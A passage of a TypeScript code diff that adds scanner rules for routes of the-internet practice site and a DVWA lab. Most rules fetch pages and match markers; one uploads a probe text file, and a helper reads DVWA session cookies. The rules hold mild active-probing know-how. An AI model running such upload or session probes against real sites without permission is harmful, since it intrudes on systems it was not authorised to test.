+    /onclick=["']jsConfirm\(\)["']/i.test(doc.body) &&
+    /onclick=["']jsPrompt\(\)["']/i.test(doc.body);
+  if (!hasJsAlert || !hasConfirm || !hasPrompt || !hasButtons) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.91,
+    evidence: {
+      scannedUrl: pageUrl,
+      alertsUrl,
+      markers: ["jsAlert()", "jsConfirm()", "jsPrompt()"],
+      snippet: doc.body.match(/JavaScript Alerts[\s\S]{0,120}/i)?.[0]?.slice(0, 100),
+      note: "the-internet /javascript_alerts route scan — onclick handlers invoke jsAlert/jsConfirm/jsPrompt dialogs — Elemental Selenium JavaScript alert training oracle"
+    }
+  };
+};
+
+function extractTheInternetAvatarPaths(html: string): string[] {
+  return [...html.matchAll(/\/img\/avatars\/([^'">\s]+)/gi)].map((m) => m[1]);
+}
+
+function extractDvwaSessionValue(cookies: string[]): number | null {
+  for (const raw of cookies) {
+    const m = /(?:^|;\s*)dvwaSession=(\d+)/i.exec(raw);
+    if (m) return parseInt(m[1], 10);
+  }
+  return null;
+}
+
+function cookieHeaderFromSetCookies(cookies: string[]): string {
+  return cookies
+    .map((c) => c.split(";")[0].trim())
+    .filter(Boolean)
+    .join("; ");
+}
+
+const theInternetDynamicContentRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTheInternetHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/dynamic_content(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const dynamicUrl = new URL("/dynamic_content", ctx.origin).toString();
+  const staticUrl = new URL("/dynamic_content", ctx.origin);
+  staticUrl.searchParams.set("with_content", "static");
+  const dynamicDoc = await ctx.probe.get(dynamicUrl, { maxBytes: 16384, timeoutMs: 15000 });
+  if (dynamicDoc.status < 200 || dynamicDoc.status >= 400) return NEGATIVE;
+  if (!/with_content=static/i.test(dynamicDoc.body)) return NEGATIVE;
+  const staticDoc = await ctx.probe.get(staticUrl.toString(), { maxBytes: 16384, timeoutMs: 15000 });
+  if (staticDoc.status < 200 || staticDoc.status >= 400) return NEGATIVE;
+  const dynamicAvatars = extractTheInternetAvatarPaths(dynamicDoc.body);
+  const staticAvatars = extractTheInternetAvatarPaths(staticDoc.body);
+  if (dynamicAvatars.length < 2 || staticAvatars.length < 2) return NEGATIVE;
+  if (dynamicAvatars.join("|") === staticAvatars.join("|")) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      scannedUrl: pageUrl,
+      dynamicUrl,
+      staticUrl: staticUrl.toString(),
+      dynamicAvatars: dynamicAvatars.slice(0, 3),
+      staticAvatars: staticAvatars.slice(0, 3),
+      note: "the-internet /dynamic_content route scan — avatar images differ from ?with_content=static frozen layout — Elemental Selenium dynamic content oracle"
+    }
+  };
+};
+
+const theInternetForgotPasswordRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTheInternetHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/forgot_password(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const formUrl = new URL("/forgot_password", ctx.origin).toString();
+  const doc = await ctx.probe.get(formUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const hasForm = /<form[^>]+(?:name|id)=["']forgot_password["']/i.test(doc.body);
+  const hasEmail = /<input[^>]+name=["']email["']/i.test(doc.body);
+  const hasSubmit = /Retrieve password/i.test(doc.body);
+  if (!hasForm || !hasEmail || !hasSubmit) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      scannedUrl: pageUrl,
+      formUrl,
+      markers: ["form#forgot_password", "input#email", "Retrieve password"],
+      note: "the-internet /forgot_password route scan — email recovery form without rate limiting or CAPTCHA — Elemental Selenium forgot-password training oracle"
+    }
+  };
+};
+
+const theInternetRedirectRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTheInternetHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/redirect(?:\/|$|\?)/i.test(pageUrl) || /\/redirector/i.test(pageUrl)) return NEGATIVE;
+  const redirectUrl = new URL("/redirect", ctx.origin).toString();
+  const doc = await ctx.probe.get(redirectUrl, {
+    maxBytes: 2048,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  const location = doc.headers["location"] || doc.headers.location || "";
+  if (![301, 302, 303, 307, 308].includes(doc.status)) return NEGATIVE;
+  if (!/status_codes/i.test(location)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      scannedUrl: pageUrl,
+      redirectUrl,
+      status: doc.status,
+      location: location.slice(0, 120),
+      note: "the-internet /redirect route scan — GET returns HTTP 302 Location to /status_codes — Elemental Selenium HTTP redirection training oracle (fixed destination, not open redirect)"
+    }
+  };
+};
+
+const theInternetShadowdomRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTheInternetHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/shadowdom(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const shadowUrl = new URL("/shadowdom", ctx.origin).toString();
+  const doc = await ctx.probe.get(shadowUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const hasCustomElement = /customElements\.define\s*\(\s*['"]my-paragraph['"]/i.test(doc.body);
+  const hasShadowRoot = /attachShadow\s*\(\s*\{\s*mode\s*:\s*['"]open['"]\s*\}\s*\)/i.test(doc.body);
+  const hasTemplateSlot =
+    /<template[^>]*id=["']my-paragraph["']/i.test(doc.body) && /slot=["']my-text["']/i.test(doc.body);
+  if (!hasCustomElement || !hasShadowRoot || !hasTemplateSlot) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.91,
+    evidence: {
+      scannedUrl: pageUrl,
+      shadowUrl,
+      markers: ["customElements.define", "attachShadow({mode:'open'})", "slot=my-text"],
+      snippet: doc.body.match(/customElements\.define[\s\S]{0,120}/i)?.[0]?.slice(0, 100),
+      note: "the-internet /shadowdom route scan — custom element with open shadow root and slotted template content — Elemental Selenium shadow DOM training oracle"
+    }
+  };
+};
+
+const theInternetFileUploadRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTheInternetHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/(?:file[-_]?)?upload(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const uploadUrl = new URL("/upload", ctx.origin).toString();
+  const hubDoc = await ctx.probe.get(uploadUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  if (hubDoc.status < 200 || hubDoc.status >= 400) return NEGATIVE;
+  if (!/file-uploader|drag-drop-upload/i.test(hubDoc.body)) return NEGATIVE;
+  const probeName = `thugir-upload-${Date.now().toString(36)}.txt`;
+  const boundary = `----ThugirInternetUpload${Date.now().toString(36)}`;
+  const body = [
+    `--${boundary}`,
+    `Content-Disposition: form-data; name="file"; filename="${probeName}"`,
+    "Content-Type: text/plain",
+    "",
+    "thugir-upload-probe",
+    `--${boundary}--`,
+    ""
+  ].join("\r\n");
+  const doc = await ctx.probe.get(uploadUrl, {
+    method: "POST",
+    body,
+    headers: { "Content-Type": `multipart/form-data; boundary=${boundary}` },
+    maxBytes: 8192,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/File Uploaded!/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      scannedUrl: pageUrl,
+      uploadUrl,
+      probeName,
+      snippet: doc.body.match(/File Uploaded![^<]{0,80}/i)?.[0] || doc.body.slice(0, 200).trim(),
+      note: "the-internet /upload route scan — POST multipart file returns File Uploaded! without type validation — Elemental Selenium file upload oracle"
+    }
+  };
+};
+
+const theInternetRedirectorRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTheInternetHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/redirector(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const redirectorUrl = new URL("/redirector", ctx.origin).toString();
+  const doc = await ctx.probe.get(redirectorUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const hasHeading = /<h3>\s*Redirection\s*<\/h3>/i.test(doc.body);
+  const hasRedirectLink = /id=['"]redirect['"][^>]*href=['"]redirect['"]/i.test(doc.body);
+  const mentionsStatusCodes = /status codes page/i.test(doc.body);
+  if (!hasHeading || !hasRedirectLink || !mentionsStatusCodes) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      scannedUrl: pageUrl,
+      redirectorUrl,
+      markers: ["h3 Redirection", "a#redirect", "status codes page"],
+      note: "the-internet /redirector route scan — link-based redirect training lab with #redirect anchor to /redirect — Elemental Selenium redirection oracle"
+    }
+  };
+};
+
+const theInternetStatusCodesRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTheInternetHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/status_codes(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const hubUrl = new URL("/status_codes", ctx.origin).toString();
+  const hubDoc = await ctx.probe.get(hubUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  if (hubDoc.status < 200 || hubDoc.status >= 400) return NEGATIVE;
+  if (!/<h3>\s*Status Codes\s*<\/h3>/i.test(hubDoc.body)) return NEGATIVE;
+  const codes = [200, 301, 404, 500].filter((code) =>
+    new RegExp(`>\\s*${code}\\s*<|/status_codes/${code}`, "i").test(hubDoc.body)
+  );
+  if (codes.length < 3) return NEGATIVE;
+  const okUrl = new URL("/status_codes/200", ctx.origin).toString();
+  const okDoc = await ctx.probe.get(okUrl, { maxBytes: 4096, timeoutMs: 15000 });
+  if (okDoc.status !== 200 || !/\b200\b/.test(okDoc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.91,
+    evidence: {
+      scannedUrl: pageUrl,
+      hubUrl,
+      okUrl,
+      codesListed: codes,
+      okStatus: okDoc.status,
+      note: "the-internet /status_codes route scan — hub enumerates HTTP status codes and /status_codes/200 returns 200 — Elemental Selenium status-code training oracle"
+    }
+  };
+};
+
+const theInternetBrokenImagesRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTheInternetHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/broken_images(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const brokenUrl = new URL("/broken_images", ctx.origin).toString();
+  const doc = await ctx.probe.get(brokenUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/<h3>\s*Broken Images\s*<\/h3>/i.test(doc.body)) return NEGATIVE;
+  const brokenSrcs = [...doc.body.matchAll(/<img[^>]+src=["']([^"']+)["']/gi)]
+    .map((m) => m[1])
+    .filter((src) => /^(?:asdf|hjkl)\.jpg$/i.test(src));
+  if (brokenSrcs.length < 2) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      scannedUrl: pageUrl,
+      brokenUrl,
+      brokenSrcs,
+      note: "the-internet /broken_images route scan — relative img src asdf.jpg and hjkl.jpg 404 without path validation — Elemental Selenium broken-image training oracle"
+    }
+  };
+};
+
+const theInternetChallengingDomRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTheInternetHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/challenging_dom(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const domUrl = new URL("/challenging_dom", ctx.origin).toString();
+  const doc = await ctx.probe.get(domUrl, { maxBytes: 16384, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/<h3>\s*Challenging DOM\s*<\/h3>/i.test(doc.body)) return NEGATIVE;
+  const hasUuidButtons = /<a\s+id=['"][0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}['"][^>]*class=['"]button/i.test(
+    doc.body
+  );
+  const hasCanvas = /<canvas[^>]+id=['"]canvas['"]/i.test(doc.body);
+  const hasTableRows = /<td>\s*Iuvaret\d+\s*<\/td>/i.test(doc.body);
+  if (!hasUuidButtons || !hasCanvas || !hasTableRows) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.91,
+    evidence: {
+      scannedUrl: pageUrl,
+      domUrl,
+      markers: ["UUID button ids", "canvas#canvas", "Iuvaret table rows"],
+      note: "the-internet /challenging_dom route scan — dynamic UUID locators, canvas element, and unlabeled table rows — Elemental Selenium challenging DOM training oracle"
+    }
+  };
+};
+
+const theInternetFramesRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTheInternetHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/frames(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const framesUrl = new URL("/frames", ctx.origin).toString();
+  const doc = await ctx.probe.get(framesUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/<h3>\s*Frames\s*<\/h3>/i.test(doc.body)) return NEGATIVE;
+  const hasNestedFrames = /href=['"]\/nested_frames['"]/i.test(doc.body);
+  const hasIframe = /href=['"]\/iframe['"]/i.test(doc.body);
+  if (!hasNestedFrames || !hasIframe) return NEGATIVE;
+  const nestedUrl = new URL("/nested_frames", ctx.origin).toString();
+  const nestedDoc = await ctx.probe.get(nestedUrl, { maxBytes: 4096, timeoutMs: 15000 });
+  const hasFrameset =
+    nestedDoc.status >= 200 &&
+    nestedDoc.status < 400 &&
+    /<frameset/i.test(nestedDoc.body) &&
+    /frame[^>]+src=['"]\/frame_(?:top|bottom)['"]/i.test(nestedDoc.body);
+  if (!hasFrameset) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      scannedUrl: pageUrl,
+      framesUrl,
+      nestedUrl,
+      markers: ["nested_frames link", "iframe link", "frameset frame_top/frame_bottom"],
+      note: "the-internet /frames route scan — hub links to nested frameset and iframe labs — Elemental Selenium frame-switching training oracle"
+    }
+  };
+};
+
+const theInternetHoversRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTheInternetHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/hovers(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const hoversUrl = new URL("/hovers", ctx.origin).toString();
+  const doc = await ctx.probe.get(hoversUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/<h3>\s*Hovers\s*<\/h3>/i.test(doc.body)) return NEGATIVE;
+  const hasHoverCss = /\.figure:hover\s+\.figcaption/i.test(doc.body);
+  const hasUserProfiles = /name:\s*user\d+/i.test(doc.body) && /href=['"]\/users\/\d+['"]/i.test(doc.body);
+  const avatarCount = (doc.body.match(/avatar-blank\.jpg/gi) || []).length;
+  if (!hasHoverCss || !hasUserProfiles || avatarCount < 2) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      scannedUrl: pageUrl,
+      hoversUrl,
+      avatarCount,
+      markers: [".figure:hover .figcaption", "name: userN", "/users/N profile links"],
+      note: "the-internet /hovers route scan — CSS :hover reveals hidden figcaption user profiles — Elemental Selenium hover interaction training oracle"
+    }
+  };
+};
+
+const theInternetInfiniteScrollRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTheInternetHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/infinite_scroll(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const scrollUrl = new URL("/infinite_scroll", ctx.origin).toString();
+  const doc = await ctx.probe.get(scrollUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/<h3>\s*Infinite Scroll\s*<\/h3>/i.test(doc.body)) return NEGATIVE;
+  const hasJscroll =
+    /jquery\.jscroll\.min\.js/i.test(doc.body) && /\$\(['"]\.scroll['"]\)\.jscroll\(\)/i.test(doc.body);
+  const hasNextLink = /href=['"]\/infinite_scroll\/1['"]/i.test(doc.body);
+  if (!hasJscroll || !hasNextLink) return NEGATIVE;
+  const page1Url = new URL("/infinite_scroll/1", ctx.origin).toString();
+  const page1Doc = await ctx.probe.get(page1Url, { maxBytes: 16384, timeoutMs: 15000 });
+  if (page1Doc.status < 200 || page1Doc.status >= 400) return NEGATIVE;
+  const hasPage2Link = /href=['"]\/infinite_scroll\/2['"]/i.test(page1Doc.body);
+  const hasLongContent = page1Doc.body.replace(/<[^>]+>/g, "").trim().length > 500;
+  if (!hasPage2Link || !hasLongContent) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      scannedUrl: pageUrl,
+      scrollUrl,
+      page1Url,
+      markers: ["jscroll plugin", "/infinite_scroll/1 next link", "/infinite_scroll/2 pagination"],
+      note: "the-internet /infinite_scroll route scan — jScroll infinite pagination loads long DOM chunks via next-page links — Elemental Selenium infinite-scroll training oracle"
+    }
+  };
+};
+
+const theInternetJqueryuiMenuRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTheInternetHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/jqueryui\/menu(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const menuUrl = new URL("/jqueryui/menu", ctx.origin).toString();
+  const doc = await ctx.probe.get(menuUrl, { maxBytes: 16384, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const hasMenuHeading = /<h3>\s*JQueryUI\s*-\s*Menu\s*<\/h3>/i.test(doc.body);
+  const hasMenuWidget =
+    /<ul[^>]+id=['"]menu['"]/i.test(doc.body) &&
+    /ui-state-disabled/i.test(doc.body) &&
+    /Should not see this/i.test(doc.body);
+  const hasMenuInit = /\$\(\s*["']#menu["']\s*\)\.menu\(\)/i.test(doc.body);
+  const hasDownloadLinks =
+    /\/download\/jqueryui\/menu\/menu\.pdf/i.test(doc.body) &&
+    /\/download\/jqueryui\/menu\/menu\.csv/i.test(doc.body);
+  if (!hasMenuHeading || !hasMenuWidget || !hasMenuInit || !hasDownloadLinks) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.91,
+    evidence: {
+      scannedUrl: pageUrl,
+      menuUrl,
+      markers: ["#menu widget", "ui-state-disabled hidden item", "menu.pdf/menu.csv downloads"],
+      note: "the-internet /jqueryui/menu route scan — JQuery UI nested menu with CSS-hidden disabled items and download submenu — Elemental Selenium menu interaction training oracle"
+    }
+  };
+};
+
+const theInternetTinymceRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTheInternetHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/tinymce(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const tinymceUrl = new URL("/tinymce", ctx.origin).toString();
+  const doc = await ctx.probe.get(tinymceUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/<h3>\s*An iFrame containing the TinyMCE WYSIWYG Editor\s*<\/h3>/i.test(doc.body)) return NEGATIVE;
+  const hasTinyScript = /cdn\.tiny\.cloud\/[^"']+\/tinymce/i.test(doc.body);
+  const hasTinyInit =
+    /tinymce\.init\s*\(/i.test(doc.body) && /selector\s*:\s*['"]textarea['"]/i.test(doc.body);
+  const hasTextarea = /<textarea[^>]*>Your content goes here\./i.test(doc.body);
+  if (!hasTinyScript || !hasTinyInit || !hasTextarea) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      scannedUrl: pageUrl,
+      tinymceUrl,
+      markers: ["cdn.tiny.cloud tinymce.min.js", "tinymce.init selector:textarea", "WYSIWYG textarea"],
+      note: "the-internet /tinymce route scan — TinyMCE WYSIWYG editor iframe bound to textarea — Elemental Selenium rich-text editor training oracle"
+    }
+  };
+};
+
+const theInternetDynamicControlsRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTheInternetHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/dynamic_controls(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const controlsUrl = new URL("/dynamic_controls", ctx.origin).toString();
+  const doc = await ctx.probe.get(controlsUrl, { maxBytes: 16384, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/<h4>\s*Dynamic Controls\s*<\/h4>/i.test(doc.body)) return NEGATIVE;
+  const hasCheckboxExample =
+    /id=['"]checkbox-example['"]/i.test(doc.body) &&
+    /id=['"]checkbox['"]/i.test(doc.body) &&
+    /swapCheckbox/i.test(doc.body);
+  const hasInputExample =
+    /id=['"]input-example['"]/i.test(doc.body) &&
+    /swapInput/i.test(doc.body) &&
+    /pauseThenToggleControls/i.test(doc.body);
+  if (!hasCheckboxExample || !hasInputExample) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      scannedUrl: pageUrl,
+      controlsUrl,
+      markers: ["#checkbox-example", "#input-example", "swapCheckbox/swapInput AJAX toggles"],
+      note: "the-internet /dynamic_controls route scan — checkbox and input forms toggle enabled/disabled state via delayed AJAX — Elemental Selenium dynamic controls training oracle"
+    }
+  };
+};
+
+const theInternetContextMenuRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTheInternetHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/context_menu(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const menuUrl = new URL("/context_menu", ctx.origin).toString();
+  const doc = await ctx.probe.get(menuUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/<h3>\s*Context Menu\s*<\/h3>/i.test(doc.body)) return NEGATIVE;
+  const hasHotSpot =
+    /id=['"]hot-spot['"]/i.test(doc.body) &&
+    /oncontextmenu=['"]displayMessage\(\)['"]/i.test(doc.body);
+  const hasAlertHandler = /function\s+displayMessage\s*\(\)\s*\{[^}]*window\.alert/i.test(doc.body);
+  const mentionsRightClick = /right-click/i.test(doc.body) && /the-internet/i.test(doc.body);
+  if (!hasHotSpot || !hasAlertHandler || !mentionsRightClick) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.91,
+    evidence: {
+      scannedUrl: pageUrl,
+      menuUrl,
+      markers: ["#hot-spot oncontextmenu", "displayMessage alert", "right-click the-internet menu"],
+      note: "the-internet /context_menu route scan — custom right-click context menu triggers JavaScript alert — Elemental Selenium context-menu training oracle"
+    }
+  };
+};
+
+const theInternetKeyPressesRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTheInternetHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/key_presses(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const keyUrl = new URL("/key_presses", ctx.origin).toString();
+  const doc = await ctx.probe.get(keyUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/<h3>\s*Key Presses\s*<\/h3>/i.test(doc.body)) return NEGATIVE;
+  const hasTargetInput = /id=['"]target['"]/i.test(doc.body) && /<input[^>]+type=['"]text['"]/i.test(doc.body);
+  const hasKeydownHandler =
+    /\$\(document\)\.keydown\s*\(/i.test(doc.body) &&
+    /getElementById\s*\(\s*['"]result['"]\s*\)/i.test(doc.body);
+  const hasResultSink = /id=['"]result['"]/i.test(doc.body);
+  if (!hasTargetInput || !hasKeydownHandler || !hasResultSink) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      scannedUrl: pageUrl,
+      keyUrl,
+      markers: ["#target input", "$(document).keydown", "#result innerHTML sink"],
+      note: "the-internet /key_presses route scan — jQuery keydown handler writes pressed keys to #result innerHTML — Elemental Selenium key-press training oracle"
+    }
+  };
+};
+
+const theInternetLargeRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTheInternetHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/large(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const largeUrl = new URL("/large", ctx.origin).toString();
+  const doc = await ctx.probe.get(largeUrl, { maxBytes: 65536, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/<h3>\s*Large\s*&\s*Deep\s*DOM\s*<\/h3>/i.test(doc.body)) return NEGATIVE;
+  const hasDeepTier =
+    /id=['"]sibling-50\.1['"]/i.test(doc.body) &&
+    /tier-50/i.test(doc.body) &&
+    /id=['"]siblings['"]/i.test(doc.body);
+  const mentionsDepth = /nested\s+50\s+levels/i.test(doc.body);
+  if (!hasDeepTier || !mentionsDepth) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.91,
+    evidence: {
+      scannedUrl: pageUrl,
+      largeUrl,
+      markers: ["#siblings tier-50", "sibling-50.1 nested DOM", "50 levels deep"],
+      note: "the-internet /large route scan — 50-tier nested sibling DOM tree stresses locator strategies — Elemental Selenium large/deep DOM training oracle"
+    }
+  };
+};
+
+const theInternetAddRemoveElementsRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTheInternetHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/add_remove_elements(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const elementsUrl = new URL("/add_remove_elements/", ctx.origin).toString();
+  const doc = await ctx.probe.get(elementsUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/<h3>\s*Add\/Remove Elements\s*<\/h3>/i.test(doc.body)) return NEGATIVE;
+  const hasAddButton = /onclick=['"]addElement\(\)['"]/i.test(doc.body);
+  const hasDynamicDelete =
+    /function\s+addElement\s*\(/i.test(doc.body) &&
+    /function\s+deleteElement\s*\(/i.test(doc.body) &&
+    /added-manually/i.test(doc.body);
+  const hasElementsContainer = /id=['"]elements['"]/i.test(doc.body);
+  if (!hasAddButton || !hasDynamicDelete || !hasElementsContainer) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.91,
+    evidence: {
+      scannedUrl: pageUrl,
+      elementsUrl,
+      markers: ["addElement() button", "deleteElement() .added-manually", "#elements container"],
+      note: "the-internet /add_remove_elements route scan — jQuery appends/removes Delete buttons dynamically — Elemental Selenium add/remove elements training oracle"
+    }
+  };
+};
+
+const theInternetNestedFramesRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTheInternetHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/nested_frames(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const nestedUrl = new URL("/nested_frames", ctx.origin).toString();
+  const doc = await ctx.probe.get(nestedUrl, { maxBytes: 4096, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const hasFrameset =
+    /<frameset/i.test(doc.body) &&
+    /frame[^>]+src=['"]\/frame_top['"]/i.test(doc.body) &&
+    /frame[^>]+src=['"]\/frame_bottom['"]/i.test(doc.body);
+  if (!hasFrameset) return NEGATIVE;
+  const topUrl = new URL("/frame_top", ctx.origin).toString();
+  const topDoc = await ctx.probe.get(topUrl, { maxBytes: 4096, timeoutMs: 15000 });
+  const hasInnerFrameset =
+    topDoc.status >= 200 &&
+    topDoc.status < 400 &&
+    /<frameset/i.test(topDoc.body) &&
+    /frame[^>]+src=['"]\/frame_(?:left|middle|right)['"]/i.test(topDoc.body);
+  const bottomUrl = new URL("/frame_bottom", ctx.origin).toString();
+  const bottomDoc = await ctx.probe.get(bottomUrl, { maxBytes: 2048, timeoutMs: 15000 });
+  const hasBottomContent =
+    bottomDoc.status >= 200 && bottomDoc.status < 400 && /\bBOTTOM\b/i.test(bottomDoc.body);
+  if (!hasInnerFrameset || !hasBottomContent) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      scannedUrl: pageUrl,
+      nestedUrl,
+      topUrl,
+      bottomUrl,
+      markers: ["frameset frame_top/frame_bottom", "frame_left/middle/right", "BOTTOM leaf frame"],
+      note: "the-internet /nested_frames route scan — nested frameset with frame_top 3-column split and frame_bottom leaf — Elemental Selenium nested-frame training oracle"
+    }
+  };
+};
+
+const pentestGroundDvwaWeakIdRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPentestGroundDvwaHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/vulnerabilities\/weak(?:_id|_session_ids)\/?/i.test(pageUrl)) return NEGATIVE;
